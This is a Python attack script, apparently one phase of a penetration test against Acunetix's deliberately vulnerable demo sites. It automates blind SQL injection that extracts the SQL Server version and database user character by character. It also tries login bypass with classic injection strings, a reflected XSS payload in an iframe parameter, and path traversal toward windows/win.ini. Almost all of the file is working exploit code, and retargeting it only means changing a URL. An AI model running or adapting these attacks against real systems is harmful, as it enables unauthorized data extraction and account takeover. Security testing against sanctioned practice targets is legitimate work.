#!/usr/bin/env python3
"""PHASE 5: FINAL EXTRACTION — SQL Server version via blind oracle + auth bypass + iframe injection
   Target: testasp.vulnweb.com / testaspnet.vulnweb.com (authorized Acunetix test sites)"""
import urllib.request, urllib.error, urllib.parse, re

GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[93m"; MAG="\033[95m"; END="\033[0m"; BOLD="\033[1m"
UA={"User-Agent":"Mozilla/5.0 (compatible; SecurityTestSuite/1.0)"}
BASE="http://testasp.vulnweb.com"

def get(url, timeout=20):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return None

def oracle(expr):
    """TRUE -> 200, FALSE -> 500"""
    url = f"{BASE}/showforum.asp?id=0+AND+({urllib.parse.quote(expr)})"
    return get(url) == 200

print(f"""{MAG}{BOLD}
=====================================================================
  PHASE 5: FINAL PROOF-OF-DATA-EXTRACTION (blind SQLi oracle)
====================================================================={END}""")

# ---- T18: extract @@VERSION (first 28 chars) — real DB fingerprint ----
print(f"\n{BOLD}[T18] EXTRACTING @@VERSION (SQL Server build) char-by-char via binary search{END}")
extracted = ""
for pos in range(1, 29):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING(@@version,{pos},1))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    extracted += chr(lo)
    print(f"    [{pos:2d}] → {extracted}")
print(f"\n  {RED}>>> EXTRACTED @@VERSION = {extracted}{END}")

# ---- T19: current DB user ----
print(f"\n{BOLD}[T19] EXTRACTING CURRENT USER (SYSTEM_USER){END}")
length_known = None
for L in range(1, 30):
    if oracle(f"LEN(SYSTEM_USER)={L}"):
        length_known = L; break
if length_known:
    user = ""
    for pos in range(1, length_known + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING(SYSTEM_USER,{pos},1))>={mid}"): lo = mid
            else: hi = mid - 1
        user += chr(lo)
    print(f"  {RED}>>> EXTRACTED SYSTEM_USER = {user}{END}")
else:
    print(f"  {YELLOW}length probe failed{END}")

# ---- T20: AUTH BYPASS with correct field names (tfUName/tfUPass) ----
print(f"\n{BOLD}[T20] AUTH BYPASS — POST /Login.asp (tfUName/tfUPass){END}")
import difflib
def post_login(u, p):
    data = urllib.parse.urlencode({"tfUName": u, "tfUPass": p}).encode()
    req = urllib.request.Request(f"{BASE}/Login.asp?RetURL=%2FDefault%2Easp%3F", data=data, headers=UA)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)

s0, b0 = post_login("nonexistent_xyz", "wrongpass")
print(f"  Baseline bogus creds → HTTP {s0}, {len(b0)}B | login-error present: {'incorrect' in b0.lower() or 'error' in b0.lower()}")
for name, u, p in [
    ("' OR 1=1 --",       "' OR 1=1 --",       "x"),
    ("admin' --",          "admin' --",          "x"),
    ("' OR 'x'='x",        "' OR 'x'='x",        "' OR 'x'='x"),
]:
    s, b = post_login(u, p)
    same = difflib.SequenceMatcher(None, b0, b).ratio()
    logged_out = "Login" in b and "RetURL" in b
    print(f"  [{name:16s}] → HTTP {s}, {len(b)}B, sim-to-baseline {same:.2f}, still-showing-login-form={logged_out}")
    if s == 302 or (s == 200 and same < 0.5 and not logged_out):
        print(f"  {RED}>>> BYPASS SUCCESSFUL{END}")

# ---- T21: XSS in iframe src on testaspnet ----
print(f"\n{BOLD}[T21] IFRAME SRC INJECTION — testaspnet ReadNews.aspx?NewsAd={END}")
payload = '"><script>alert(2)</script>'
url = f"http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd={urllib.parse.quote(payload)}"
try:
    with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=20) as r:
        b = r.read().decode(errors="replace")
    m = re.search(r'<iframe[^>]*>', b)
    if m: print(f"  iframe tag: {m.group(0)[:180]}")
    if payload in b or "<script>alert(2)" in b:
        print(f"  {RED}>>> XSS VIA IFRAME SRC CONFIRMED — payload injected into src attribute unescaped{END}")
    else:
        # traversal attempt via NewsAd
        for name, pl in [("win.ini", "../....//windows/win.ini"), ("abs path", "../../windows/win.ini")]:
            u2 = f"http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd={urllib.parse.quote(pl)}"
            with urllib.request.urlopen(urllib.request.Request(u2, headers=UA), timeout=20) as r:
                b2 = r.read().decode(errors="replace")
            m2 = re.search(r'src="([^"]*)"', b2)
            print(f"  [{name}] iframe src → {m2.group(1)[:100] if m2 else 'n/a'}")
        print(f"  {YELLOW}NewsAd reflected but context needs browser-side verification{END}")
except Exception as e:
    print(f"  error: {e}")

print(f"\n{GREEN}{BOLD}===== PHASE 5 COMPLETE ====={END}")
